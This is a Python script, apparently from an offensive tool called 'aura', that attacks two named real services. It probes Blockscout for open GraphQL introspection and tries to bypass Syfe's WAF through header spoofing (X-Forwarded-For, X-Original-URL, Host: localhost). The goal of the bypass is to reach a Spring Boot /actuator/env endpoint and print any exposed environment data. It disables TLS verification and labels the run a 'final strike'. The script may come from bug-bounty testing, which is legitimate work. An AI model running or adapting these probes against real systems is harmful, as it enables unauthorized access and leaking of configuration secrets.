import asyncio
import httpx
import json
from aura.ui.formatter import console

async def test_blockscout_logic():
    console.print("[bold cyan][*] Auditing Blockscout API Logic...[/bold cyan]")
    # Main Blockscout REST/GraphQL API
    target = "https://blockscout.com/api/v1/pages/blocks" # Example block page
    
    async with httpx.AsyncClient(verify=False, timeout=10) as client:
        try:
            r = await client.get(target)
            if r.status_code == 200:
                console.print(f"  [green][+] Blockscout API (/pages/blocks) is Reachable.[/green]")
                # Test for BOLA on a specific block if applicable
                # Usually public data, but we look for internal fields
                if 'items' in r.json():
                     console.print(f"    [.] Found {len(r.json()['items'])} block items.")
            
            # Probing for unauthenticated GraphQL
            gql_url = "https://blockscout.com/api/v1/graphql"
            r_gql = await client.post(gql_url, json={"query": "{ __schema { types { name } } }"})
            if r_gql.status_code == 200:
                console.print(f"  [bold red][!!!] Blockscout GraphQL Introspection Enabled: {gql_url}[/bold red]")
                return True
        except Exception as e:
            console.print(f"  [red][!] Blockscout Error: {e}[/red]")
    return False

async def test_syfe_waf_bypass():
    console.print("[bold cyan][*] Attempting Syfe WAF Bypass (Actuator)...[/bold cyan]")
    target = "https://api-au.syfe.com/actuator/env"
    
    headers_to_test = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/actuator/env"},
        {"X-Rewrite-URL": "/actuator/env"},
        {"Host": "localhost"},
        {"Host": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"}
    ]
    
    async with httpx.AsyncClient(verify=False, timeout=10) as client:
        for headers in headers_to_test:
            try:
                r = await client.get(target, headers=headers)
                if r.status_code == 200:
                    if "{" in r.text or "[" in r.text:
                        console.print(f"  [bold red][!!!] SYFE WAF BYPASS SUCCESS WITH HEADERS: {headers}[/bold red]")
                        console.print(f"    Preview: {r.text[:200]}...")
                        return True
                # console.print(f"  [.] Testing {headers} -> {r.status_code}")
            except Exception as e:
                pass
    console.print("  [yellow][.] Syfe WAF bypass attempts failed (403 remained).[/yellow]")
    return False

async def run_final_strike():
    bs_hit = await test_blockscout_logic()
    syfe_hit = await test_syfe_waf_bypass()
    
    if not (bs_hit or syfe_hit):
        console.print("\n[bold yellow]No High-Veracity Logic Hits in this round. Hardened Infrastructure Detected.[/bold yellow]")

if __name__ == "__main__":
    asyncio.run(run_final_strike())
